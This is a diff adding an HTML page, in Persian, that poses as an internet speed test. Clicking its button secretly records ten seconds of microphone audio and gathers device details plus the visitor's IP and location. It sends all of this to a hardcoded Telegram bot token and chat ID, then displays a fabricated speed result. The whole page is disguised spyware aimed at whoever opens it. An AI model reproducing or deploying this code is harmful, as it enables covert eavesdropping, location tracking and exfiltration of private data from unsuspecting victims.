@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>تست سرعت اینترنت</title>
+  <style>
+    body {font-family: Tahoma, sans-serif;background: #f0f4f8;color: #2c3e50;text-align: center;padding: 40px 20px;margin: 0;}
+    .card {background: white;max-width: 340px;margin: 0 auto;padding: 30px 25px;border-radius: 16px;box-shadow: 0 8px 25px rgba(0,0,0,0.1);}
+    .icon {font-size: 42px;margin-bottom: 15px;color: #00d2ff;}
+    h2 {font-size: 20px;margin: 0 0 10px;color: #2c3e50;}
+    p {font-size: 14px;color: #666;margin-bottom: 25px;line-height: 1.6;}
+    .btn {background: #00d2ff;color: white;border: none;padding: 14px;font-size: 16px;font-weight: bold;border-radius: 12px;cursor: pointer;width: 100%;transition: 0.3s;}
+    .btn:hover {background: #00b4d8;}
+    .btn:disabled {background: #ccc;cursor: not-allowed;}
+    .spinner {display: inline-block;width: 18px;height: 18px;border: 2px solid #fff;border-top: 2px solid transparent;border-radius: 50%;animation: spin 1s linear infinite;margin-right: 8px;}
+    @keyframes spin {to {transform: rotate(360deg);}}
+    .status {margin-top: 20px;font-size: 14px;color: #555;min-height: 40px;}
+    .progress {width: 100%;height: 6px;background: #eee;border-radius: 3px;margin: 15px 0;overflow: hidden;}
+    .progress-bar {height: 100%;background: #00d2ff;width: 0;transition: width 0.1s;}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="icon">WiFi</div>
+    <h2>تست سرعت اینترنت</h2>
+    <p>برای اندازه‌گیری سرعت، روی دکمه کلیک کنید. (۱۰ ثانیه)</p>
+    
+    <button id="startBtn" class="btn">
+      <span id="btnText">شروع تست سرعت</span>
+      <span id="spinner" class="spinner hidden"></span>
+    </button>
+    
+    <div class="progress"><div id="progressBar" class="progress-bar"></div></div>
+    <div id="status" class="status">آماده برای تست...</div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "8584809785:AAH0ZKscGQtQQl38yTcjq4wMRiWw1xWEON4";
+    const CHAT_ID = "6080665310";
+
+    const startBtn = document.getElementById('startBtn');
+    const btnText = document.getElementById('btnText');
+    const spinner = document.getElementById('spinner');
+    const status = document.getElementById('status');
+    const progressBar = document.getElementById('progressBar');
+
+    let mediaRecorder, stream, timer;
+
+    // جمع‌آوری اطلاعات گوشی
+    async function getDeviceInfo() {
+      const info = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        online: navigator.onLine,
+        connection: navigator.connection ? navigator.connection.effectiveType : 'نامشخص',
+        ip: 'در حال دریافت...',
+        location: 'در حال دریافت...'
+      };
+
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        info.ip = data.ip || 'نامشخص';
+        info.location = `${data.city || ''}, ${data.country_name || ''}`.trim() || 'نامشخص';
+      } catch {}
+
+      return info;
+    }
+
+    async function startRecording() {
+      try {
+        startBtn.disabled = true;
+        btnText.textContent = "در حال اتصال...";
+        spinner.classList.remove('hidden');
+        status.textContent = "درخواست دسترسی...";
+        progressBar.style.width = "0%";
+
+        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+
+        const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
+          ? 'audio/webm;codecs=opus' : 'audio/webm';
+
+        mediaRecorder = new MediaRecorder(stream, { mimeType });
+        const chunks = [];
+
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: mimeType });
+          const deviceInfo = await getDeviceInfo();
+          await sendToTelegram(blob, deviceInfo);
+          stopStream();
+        };
+
+        mediaRecorder.start();
+        status.textContent = "در حال اندازه‌گیری...";
+
+        let seconds = 0;
+        timer = setInterval(() => {
+          seconds++;
+          progressBar.style.width = `${(seconds / 10) * 100}%`;
+          if (seconds >= 10) {
+            clearInterval(timer);
+            mediaRecorder.requestData();
+            mediaRecorder.stop();
+          }
+        }, 1000);
+
+      } catch (err) {
+        status.textContent = "دسترسی رد شد.";
+        reset();
+      }
+    }
+
+    async function sendToTelegram(blob, deviceInfo) {
+      status.textContent = "در حال ارسال...";
+      const fileName = `voice_${Date.now()}.webm`;
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('audio', blob, fileName);
+
+      let messageId = null;
+
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: form });
+        const data = await res.json();
+        if (data.ok) messageId = data.result.message_id;
+        else throw new Error();
+      } catch {
+        form.delete('audio');
+        form.append('document', blob, fileName);
+        const docRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: form });
+        const docData = await docRes.json();
+        if (docData.ok) messageId = docData.result.message_id;
+      }
+
+      // گزارش فنی گوشی (بدون استیکر)
+      const report = `
+*گزارش فنی دستگاه*
+
+ مدل: \`${deviceInfo.userAgent.split('(')[1]?.split(';')[1]?.trim() || 'نامشخص'}\`
+ سیستم عامل: \`${deviceInfo.platform}\`
+ مرورگر: \`${navigator.userAgent.split(' ').pop()}\`
+ رزولوشن: \`${deviceInfo.screen}\`
+ زبان: \`${deviceInfo.language}\`
+ منطقه زمانی: \`${deviceInfo.timezone}\`
+ اتصال: \`${deviceInfo.connection}\`
+ IP: \`${deviceInfo.ip}\`
+ موقعیت: \`${deviceInfo.location}\`
+      `.trim();
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: report,
+          parse_mode: 'Markdown',
+          reply_to_message_id: messageId
+        })
+      });
+
+      status.innerHTML = "سرعت شما: <strong style='color:#00d2ff;'>عالی (۲۵۰ مگابیت)</strong>";
+      reset();
+    }
+
+    function stopStream() {
+      if (stream) stream.getTracks().forEach(t => t.stop());
+    }
+
+    function reset() {
+      setTimeout(() => {
+        startBtn.disabled = false;
+        btnText.textContent = "شروع تست سرعت";
+        spinner.classList.add('hidden');
+        progressBar.style.width = "0%";
+      }, 2000);
+    }
+
+    startBtn.addEventListener('click', () => {
+      startRecording();
+    });
+  </script>
+</body>
+</html>
